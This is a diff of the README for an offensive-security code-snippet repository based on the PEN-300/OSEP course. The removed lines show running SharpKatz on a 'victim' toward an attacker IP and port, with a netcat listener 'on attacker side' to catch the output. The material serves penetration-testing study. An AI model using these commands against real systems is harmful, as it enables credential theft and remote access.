@@ -1,25 +1,3 @@
-# OSEP-code-snippets
-
-```bash
-# execute on the victim
-./sharpkatz.exe 192.168.1.1 8080
-
-# on attacker side
-nc64.exe -l -p 8080
-```
-
-
-### Tips
-
-```bash
-# dir will not work
- dir
->>> The system cannot find the file specified
-
-cmd /k dir
->>> works
-```
-
 # OSEP Code Snippets
 Code examples are provided as-is, without any form of warranty. Based on Offensive Security's [PEN-300](https://www.offensive-security.com/pen300-osep/) course.
 
